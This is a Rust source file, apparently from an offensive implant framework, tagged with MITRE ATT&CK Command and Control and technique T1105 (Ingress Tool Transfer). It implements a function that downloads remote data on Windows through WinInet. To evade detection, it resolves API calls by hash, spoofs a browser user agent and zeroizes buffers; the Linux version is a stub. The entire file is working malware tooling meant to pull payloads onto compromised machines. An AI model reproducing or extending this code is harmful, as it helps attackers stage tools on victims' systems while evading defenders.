//! Tactic: Command and Control (TA0011) / Lateral Movement (TA0008)
//! Technique: T1105 (Ingress Tool Transfer)

use crate::utils::sensitive::SensitiveData;
#[cfg(target_os = "windows")]
use alloc::vec::Vec;

#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use crate::utils::windows_definitions::{HANDLE, PVOID};
#[cfg(target_os = "windows")]
use core::ffi::c_void;

pub struct Ingress;

impl Ingress {
    #[cfg(target_os = "windows")]
    pub fn download_http(&self, url: &str) -> SensitiveData {
        unsafe {
            let wininet = hash_str(b"wininet.dll");
            let internet_open = resolve_function(wininet, hash_str(b"InternetOpenA"));
            let internet_open_url = resolve_function(wininet, hash_str(b"InternetOpenUrlA"));
            let internet_read_file = resolve_function(wininet, hash_str(b"InternetReadFile"));
            let internet_close = resolve_function(wininet, hash_str(b"InternetCloseHandle"));

            if internet_open.is_null() || internet_open_url.is_null() {
                return SensitiveData::new(b"WinInet resolution failed");
            }

            type FnInternetOpenA = unsafe extern "system" fn(*const u8, u32, *const u8, *const u8, u32) -> HANDLE;
            type FnInternetOpenUrlA = unsafe extern "system" fn(HANDLE, *const u8, *const u8, u32, u32, u32) -> HANDLE;
            type FnInternetReadFile = unsafe extern "system" fn(HANDLE, PVOID, u32, *mut u32) -> i32;
            type FnInternetCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;

            let h_inet = core::mem::transmute::<_, FnInternetOpenA>(internet_open)(
                b"Mozilla/5.0\0".as_ptr(),
                1, // INTERNET_OPEN_TYPE_DIRECT
                core::ptr::null(),
                core::ptr::null(),
                0
            );

            if h_inet.is_null() {
                return SensitiveData::new(b"InternetOpen failed");
            }

            let mut url_c = Vec::from(url.as_bytes());
            url_c.push(0);

            let h_url = core::mem::transmute::<_, FnInternetOpenUrlA>(internet_open_url)(
                h_inet,
                url_c.as_ptr(),
                core::ptr::null(),
                0,
                0x04000000 | 0x80000000, // NO_CACHE | RELOAD
                0
            );

            if h_url.is_null() {
                core::mem::transmute::<_, FnInternetCloseHandle>(internet_close)(h_inet);
                return SensitiveData::new(b"InternetOpenUrl failed");
            }

            let mut data = Vec::new();
            let mut buf = [0u8; 4096];
            let mut read = 0;

            loop {
                if core::mem::transmute::<_, FnInternetReadFile>(internet_read_file)(
                    h_url,
                    buf.as_mut_ptr() as PVOID,
                    4096,
                    &mut read
                ) == 0 || read == 0 {
                    break;
                }
                data.extend_from_slice(&buf[..read as usize]);
            }

            core::mem::transmute::<_, FnInternetCloseHandle>(internet_close)(h_url);
            core::mem::transmute::<_, FnInternetCloseHandle>(internet_close)(h_inet);

            let sd = SensitiveData::new(&data);
            data.zeroize();
            sd
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn download_http(&self, _url: &str) -> SensitiveData {
        // Linux: use std::process::Command curl/wget if we were std, but we are no_std.
        // We can use syscalls to connect socket, but that's complex (DNS resolution etc).
        // For MVP, return error.
        SensitiveData::new(b"Not supported on Linux")
    }
}
